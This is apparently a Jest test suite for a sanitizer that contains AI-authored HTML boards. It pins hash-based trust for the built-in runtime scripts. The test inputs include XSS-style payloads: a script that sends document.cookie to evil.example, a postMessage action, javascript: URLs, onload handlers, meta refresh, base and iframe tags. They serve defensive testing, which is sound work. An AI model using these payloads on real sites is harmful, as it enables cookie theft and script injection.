import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';
import {
  buildSafeDesignerSrcdoc,
  isTrustedScriptBlock,
  PARENT_ONLY_GUARD,
  sha256Hex,
  TRUSTED_RUNTIMES,
  upgradeEditShimV6Body,
} from '../designer-safe-srcdoc';

/**
 * W0-02 (audit 2026-07-12) — render-side containment for AI-authored board
 * HTML. Runnable with: pnpm --filter web exec jest src/lib/designer-safe-srcdoc
 *
 * This is the belt-and-suspenders layer (the API-side sanitizeDesignerHtml is
 * the primary strip, gated by designer-prompt.spec.ts). It contains LEGACY
 * persisted boards that were saved before the source strip existed.
 *
 * 2026-08-02 (INJ-004) — the trust decision is no longer "the block contains a
 * marker somewhere". These tests pin the new rule: leading-comment anchor +
 * byte-exact body.
 */

/** Pull `export const NAME = "…" + "…";` out of the API source and evaluate it. */
function apiConstant(name: string): string {
  const src = fs.readFileSync(
    path.join(__dirname, '../../../../../apps/api/src/ai/designer-edit-shim.ts'),
    'utf8',
  );
  const m = src.match(new RegExp('export const ' + name + ' =([\\s\\S]*?);\\n'));
  if (!m) throw new Error('could not find ' + name + ' in designer-edit-shim.ts');
  // eslint-disable-next-line no-eval
  return eval(m[1]) as string;
}
function scriptBody(block: string): string {
  const m = block.match(/^<script\b[^>]*>([\s\S]*)<\/script\s*>$/i);
  if (!m) throw new Error('not a script block');
  return m[1];
}

const REAL_EDIT_SHIM = apiConstant('DESIGNER_EDIT_SHIM');
const REAL_FIT_ENGINE = apiConstant('DESIGNER_LAYOUT_ENGINE');

/** Every EDUCMS-SHIM-V6 body ever baked into a kept board, byte for byte, with its pinned hash. */
const V6_BODIES = (JSON.parse(
  fs.readFileSync(path.join(__dirname, '../../../tests/fixtures/educms-shim-v6-bodies.json'), 'utf8'),
) as { bodies: Array<{ commit: string; sha256: string; body: string }> }).bodies;

const MALICIOUS = [
  '<!doctype html><html><head><style>.s{color:red}</style></head>',
  '<body><div class="stage" style="width:1920px;height:1080px">',
  '<h1 data-field="headline" onclick="evil()">Hi</h1>',
  // model script that posts a player action on load — the P0 vector
  '<script>parent.postMessage({type:"educms-action",action:{type:"open-url",target:"https://evil.example"}},"*")</script>',
  // trusted runtimes that MUST survive (nonce-stamped) — the REAL bodies,
  // exactly as the API bakes them into a persisted board.
  REAL_EDIT_SHIM,
  '<script>/*VOS-CANVAS*/window.__VOS_CW=1920;window.__VOS_CH=1080;</script>',
  '<a href="javascript:alert(1)">x</a>',
  '<svg onload="fetch(String.fromCharCode(104))"></svg>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/">',
  '<iframe src="https://evil.example"></iframe>',
  '</div></body></html>',
].join('');

describe('buildSafeDesignerSrcdoc (W0-02 containment)', () => {
  const out = buildSafeDesignerSrcdoc(MALICIOUS);

  it('strips the model action-posting script', () => {
    // The model's payload is gone outright.
    expect(out).not.toContain('evil.example');
    // `educms-action` alone is no longer proof of a leak: the TRUSTED baked
    // shim legitimately posts that message now (a `[data-action]` hot zone the
    // operator wired). So assert the real property — every surviving mention
    // lives INSIDE the trusted shim body, and nothing the model authored does.
    // (Defense in depth: even a surviving model script could not act, because
    // the player resolves `savedActions[key]` from the operator's saved map and
    // ignores the message's own action object — W0-02, player/page.tsx:7075.)
    // Nonce-agnostic: the baked shim is stamped with a per-render nonce, so it
    // never string-matches REAL_EDIT_SHIM. Walk the script blocks instead and
    // require that any block mentioning the message is the trusted shim itself.
    const blocks = out.split('<script').filter((b) => b.includes('educms-action'));
    expect(blocks.length).toBeGreaterThan(0); // the trusted emit must survive
    for (const b of blocks) expect(b).toContain('EDUCMS-SHIM-V7');
  });
  it('strips on* handler attributes (onclick, svg onload)', () => {
    expect(out).not.toMatch(/onclick=|onload=/i);
  });
  it('neutralizes javascript: URLs', () => {
    expect(out).not.toContain('javascript:alert');
  });
  it('strips meta refresh, <base>, and nested frames', () => {
    expect(out).not.toMatch(/http-equiv=["']?refresh/i);
    expect(out).not.toMatch(/<base|<iframe/i);
  });
  it('keeps the trusted baked runtimes (nonce-stamped)', () => {
    expect(out).toContain('__VOS_CW=1920');
    const nonce = (out.match(/script-src 'nonce-([a-f0-9]+)'/) || [])[1];
    expect(nonce).toBeTruthy();
    expect(out).toContain(`<script nonce="${nonce}">/*EDUCMS-SHIM-V7*/`);
    expect(out).toContain(`<script nonce="${nonce}">/*VOS-CANVAS*/`);
  });
  it('injects the trusted VOS-STAGE-SCALE runtime with the render nonce', () => {
    const nonce = (out.match(/script-src 'nonce-([a-f0-9]+)'/) || [])[1];
    expect(out).toContain(`<script nonce="${nonce}">/*VOS-STAGE-SCALE*/`);
  });
  it('injects a strict CSP (default-src none; no connect-src)', () => {
    expect(out).toContain("default-src 'none'");
    expect(out).not.toMatch(/connect-src/);
  });
  it('preserves styles and editability hooks', () => {
    expect(out).toContain('.s{color:red}');
    expect(out).toContain('data-field="headline"');
  });
  it('mints a fresh nonce per render', () => {
    const a = (buildSafeDesignerSrcdoc(MALICIOUS).match(/nonce-([a-f0-9]+)/) || [])[1];
    const b = (buildSafeDesignerSrcdoc(MALICIOUS).match(/nonce-([a-f0-9]+)/) || [])[1];
    expect(a).toBeTruthy();
    expect(b).toBeTruthy();
    expect(a).not.toBe(b);
  });
});

// ── INJ-004: the marker-as-comment bypass ───────────────────────────────────
describe('INJ-004 — trust is structural, not substring', () => {
  it('does NOT trust a hostile block that merely CONTAINS a marker in a comment', () => {
    const evil = "<script>fetch('https://evil.example/'+document.cookie); /* EDUCMS-SHIM-V6 */</script>";
    expect(isTrustedScriptBlock(evil)).toBe(false);

    const out = buildSafeDesignerSrcdoc('<html><head></head><body>' + evil + '</body></html>');
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('document.cookie');
  });

  it('does NOT trust a block that merely PREFIXES the marker comment onto other code', () => {
    for (const marker of ['EDUCMS-SHIM-V6', 'EDUCMS-SHIM-V7']) {
      const evil = `<script>/*${marker}*/fetch('https://evil.example')</script>`;
      expect(isTrustedScriptBlock(evil)).toBe(false);
      expect(buildSafeDesignerSrcdoc(evil)).not.toContain('evil.example');
    }
  });

  it('does NOT trust the real V7 with one byte changed — a body is trusted by its exact hash', () => {
    const tampered = REAL_EDIT_SHIM.replace('if(e.source!==window.parent)return;', 'if(e.source===null)return;');
    expect(tampered).not.toBe(REAL_EDIT_SHIM);
    expect(isTrustedScriptBlock(tampered)).toBe(false);
    expect(buildSafeDesignerSrcdoc('<html><head>' + tampered + '</head><body></body></html>')).not.toContain('EDUCMS-SHIM-V7');
  });

  it('does NOT trust a block with code BEFORE the marker comment', () => {
    const evil = "<script>evil();/*VOS-FIT-ENGINE*/</script>";
    expect(isTrustedScriptBlock(evil)).toBe(false);
  });

  it('does NOT trust a VOS-CANVAS block carrying anything but the two integer assignments', () => {
    expect(isTrustedScriptBlock('<script>/*VOS-CANVAS*/window.__VOS_CW=1;fetch("x");</script>')).toBe(false);
    expect(isTrustedScriptBlock('<script>/*VOS-CANVAS*/window.__VOS_CW=1920;</script>')).toBe(true);
    expect(isTrustedScriptBlock('<script>/*VOS-CANVAS*/window.__VOS_CW=1920;window.__VOS_CH=1080;</script>')).toBe(true);
  });

  it('DOES trust the real, byte-exact runtimes the API bakes in', () => {
    expect(isTrustedScriptBlock(REAL_EDIT_SHIM)).toBe(true);
    expect(isTrustedScriptBlock(REAL_FIT_ENGINE)).toBe(true);
  });

  it('a hostile block is never CSP-nonce-stamped (no signing oracle)', () => {
    const evil = "<script>/*VOS-STAGE-SCALE*/parent.postMessage({type:'educms-action'},'*')</script>";
    const out = buildSafeDesignerSrcdoc('<html><head></head><body>' + evil + '</body></html>');
    // the only nonce-stamped scripts are our own runtimes — the two this
    // module injects (VOS-STAGE-SCALE, and since 2026-09-23 VOS-LIVE-MENU)
    const stamped = out.match(/<script nonce="[a-f0-9]+">\/\*[A-Z0-9-]+\*\//g) || [];
    expect(stamped.map((s) => s.replace(/^.*\/\*|\*\/$/g, ''))).toEqual(['VOS-STAGE-SCALE', 'VOS-LIVE-MENU']);
    expect((out.match(/<script nonce="[a-f0-9]+">/g) || []).length).toBe(2);
    expect(out).not.toContain("postMessage({type:'educms-action'}");
  });
});

// ── Drift guard: the registry must always cover the CURRENT API bodies ──────
describe('INJ-004 — registry drift guard', () => {
  const entry = (marker: string) => TRUSTED_RUNTIMES.find((r) => r.marker === marker)!;

  it('registry pins the current EDUCMS-SHIM-V7 body', () => {
    const digest = sha256Hex(scriptBody(REAL_EDIT_SHIM));
    expect(entry('EDUCMS-SHIM-V7').hashes).toContain(digest);
  });

  it('V7 is the last V6 plus the parent-only guard — nothing else, byte for byte', () => {
    // Take the one statement back out and put the V6 marker back: what is left
    // must be EXACTLY the last V6 ever baked (the body every board kept between
    // 2026-09-12 and V7 carries) — and that body must still be pinned.
    const v7 = scriptBody(REAL_EDIT_SHIM);
    expect(v7.indexOf('/*EDUCMS-SHIM-V7*/')).toBe(0);
    expect(v7.split(PARENT_ONLY_GUARD).length - 1).toBe(1);
    const v6 = '/*EDUCMS-SHIM-V6*/' + v7.slice('/*EDUCMS-SHIM-V7*/'.length).replace(PARENT_ONLY_GUARD, '');
    const LAST_V6 = 'cd11aff07ab7d8afb3c597fa27f5f4ce3fee0a62cf23874b0b1d1cb72194dc79';
    expect(sha256Hex(v6)).toBe(LAST_V6);
    expect(entry('EDUCMS-SHIM-V6').hashes).toContain(LAST_V6);
  });

  it('every V6 body ever pinned stays pinned (saved boards carry them)', () => {
    expect(entry('EDUCMS-SHIM-V6').hashes).toEqual([
      'cd11aff07ab7d8afb3c597fa27f5f4ce3fee0a62cf23874b0b1d1cb72194dc79',
      '1ae3e413f28c9e8bfe4d106a84ff13e79eeceae8a6d7c6db97035a78db73a574',
      'cf2a1204382b12dc2978eee7ce0b62d0ffca6c49b6e133b130715acacc6c066b',
    ]);
  });

  it('registry pins the current VOS-FIT-ENGINE body', () => {
    const digest = sha256Hex(scriptBody(REAL_FIT_ENGINE));
    expect(entry('VOS-FIT-ENGINE').hashes).toContain(digest);
  });
});

// ── 2026-09-23: a saved V6 board is served V7 at render ─────────────────────
describe('EDUCMS-SHIM-V6 → V7 at render (boards kept before V7)', () => {
  const entry = (marker: string) => TRUSTED_RUNTIMES.find((r) => r.marker === marker)!;
  const board = (block: string) =>
    '<!doctype html><html><head><meta charset="utf-8">' + block + '</head>'
    + '<body><h1 data-field="headline">Hi</h1></body></html>';
  const nonceOf = (out: string) => (out.match(/script-src 'nonce-([a-f0-9]+)'/) || [])[1];
  const shimBlocks = (out: string) => out.match(/<script\b[^>]*>\/\*EDUCMS-SHIM-V\d+\*\/[\s\S]*?<\/script>/g) || [];

  it('the fixture is the real thing: every body hashes to a pinned V6, and every pin has its body', () => {
    expect(V6_BODIES.map((b) => b.sha256).sort()).toEqual([...entry('EDUCMS-SHIM-V6').hashes!].sort());
    for (const b of V6_BODIES) expect(sha256Hex(b.body)).toBe(b.sha256);
  });

  it.each(V6_BODIES.map((b) => [b.commit, b] as const))('%s: its V7 is pinned, trusted, and differs by the guard alone', (_c, b) => {
    const v7 = upgradeEditShimV6Body(b.body)!;
    expect(v7).not.toBeNull();
    expect(entry('EDUCMS-SHIM-V7').hashes).toContain(sha256Hex(v7));
    expect(isTrustedScriptBlock(`<script>${v7}</script>`)).toBe(true);
    expect(v7.split(PARENT_ONLY_GUARD).length - 1).toBe(1);
    expect('/*EDUCMS-SHIM-V6*/' + v7.slice('/*EDUCMS-SHIM-V7*/'.length).replace(PARENT_ONLY_GUARD, '')).toBe(b.body);
  });

  it('the last V6 upgrades to EXACTLY the V7 the API bakes today', () => {
    const last = V6_BODIES.find((b) => b.sha256 === 'cd11aff07ab7d8afb3c597fa27f5f4ce3fee0a62cf23874b0b1d1cb72194dc79')!;
    expect(upgradeEditShimV6Body(last.body)).toBe(scriptBody(REAL_EDIT_SHIM));
  });

  it.each(V6_BODIES.map((b) => [b.commit, b] as const))('%s: a BYTE-IDENTICAL V6 block becomes its V7, nonce-stamped, where it stood', (_c, b) => {
    const out = buildSafeDesignerSrcdoc(board(`<script>${b.body}</script>`));
    const nonce = nonceOf(out);
    expect(nonce).toBeTruthy();
    expect(out).not.toContain('EDUCMS-SHIM-V6');
    expect(shimBlocks(out)).toEqual([`<script nonce="${nonce}">${upgradeEditShimV6Body(b.body)}</script>`]);
    // Where it stood: still in <head>, still before the render-injected runtimes
    // (VOS-LIVE-MENU must run after the shim — see buildSafeDesignerSrcdoc).
    const at = out.indexOf('/*EDUCMS-SHIM-V7*/');
    expect(at).toBeLessThan(out.indexOf('/*VOS-STAGE-SCALE*/'));
    expect(at).toBeLessThan(out.indexOf('/*VOS-LIVE-MENU*/'));
    expect(at).toBeLessThan(out.indexOf('</head>'));
  });

  it('the swap reads the BODY, not the wrapper: a typed / upper-case / attributed open tag is upgraded too', () => {
    const last = V6_BODIES[V6_BODIES.length - 1].body;
    for (const open of ['<script type="text/javascript">', '<SCRIPT>', '<script data-x="1">']) {
      const out = buildSafeDesignerSrcdoc(board(`${open}${last}</script>`));
      expect(shimBlocks(out)).toEqual([`<script nonce="${nonceOf(out)}">${upgradeEditShimV6Body(last)}</script>`]);
    }
  });

  it('a V6 block that is NOT byte-identical is not upgraded — it is untrusted and stripped, as before', () => {
    const last = V6_BODIES[V6_BODIES.length - 1].body;
    const tampered = [
      last.replace("typeof d!=='object'", "typeof d!=='object'||0"), // one change inside the listener
      last + ' ', // one trailing byte
      last.replace('/*EDUCMS-SHIM-V6*/', '/*EDUCMS-SHIM-V6*/ '), // one byte after the marker
    ];
    for (const t of tampered) {
      expect(t).not.toBe(last);
      expect(isTrustedScriptBlock(`<script>${t}</script>`)).toBe(false);
      const out = buildSafeDesignerSrcdoc(board(`<script>${t}</script>`));
      expect(out).not.toContain('EDUCMS-SHIM-V7');
      expect(out).not.toContain('EDUCMS-SHIM-V6');
      expect(out).not.toContain('applyTextAndStyles');
    }
  });

  it('a board carrying V7 already is left as V7 — and wrapping the output again keeps exactly one trusted V7', () => {
    const once = buildSafeDesignerSrcdoc(board(`<script>${V6_BODIES[0].body}</script>`));
    const twice = buildSafeDesignerSrcdoc(once);
    expect(shimBlocks(twice)).toEqual([`<script nonce="${nonceOf(twice)}">${upgradeEditShimV6Body(V6_BODIES[0].body)}</script>`]);
    const baked = buildSafeDesignerSrcdoc(board(REAL_EDIT_SHIM));
    expect(shimBlocks(baked)).toEqual([`<script nonce="${nonceOf(baked)}">${scriptBody(REAL_EDIT_SHIM)}</script>`]);
  });

  it('upgradeEditShimV6Body refuses anything that is not a one-listener V6 body', () => {
    const last = V6_BODIES[V6_BODIES.length - 1].body;
    expect(upgradeEditShimV6Body(scriptBody(REAL_EDIT_SHIM))).toBeNull(); // already V7
    expect(upgradeEditShimV6Body(' ' + last)).toBeNull(); // marker not at index 0
    expect(upgradeEditShimV6Body('/*EDUCMS-SHIM-V6*/(function(){})();')).toBeNull(); // no listener
    const twoListeners = last.replace("addEventListener('message',", "addEventListener('message',function(){});addEventListener('message',");
    expect(upgradeEditShimV6Body(twoListeners)).toBeNull();
  });

  it('VOS-LIVE-MENU opens its listener with the same guard V7 adds', () => {
    const out = buildSafeDesignerSrcdoc(board(''));
    const live = out.slice(out.indexOf('/*VOS-LIVE-MENU*/'));
    expect(live).toContain(`addEventListener("message",function(e){try{${PARENT_ONLY_GUARD}var d=e.data;`);
  });
});

// ── The hand-rolled SHA-256 must actually be SHA-256 ────────────────────────
describe('sha256Hex', () => {
  const cases = [
    '',
    'abc',
    'a'.repeat(55),
    'a'.repeat(56),
    'a'.repeat(64),
    'a'.repeat(1000),
    'héllo — wörld · 中文 · 🎄🎃',
    JSON.stringify({ nested: [1, 2, 3], s: 'x'.repeat(300) }),
  ];
  it.each(cases)('matches node crypto for %#', (input) => {
    expect(sha256Hex(input)).toBe(crypto.createHash('sha256').update(input, 'utf8').digest('hex'));
  });
  it('matches node crypto for the real runtime bodies', () => {
    for (const b of [scriptBody(REAL_EDIT_SHIM), scriptBody(REAL_FIT_ENGINE)]) {
      expect(sha256Hex(b)).toBe(crypto.createHash('sha256').update(b, 'utf8').digest('hex'));
    }
  });
});
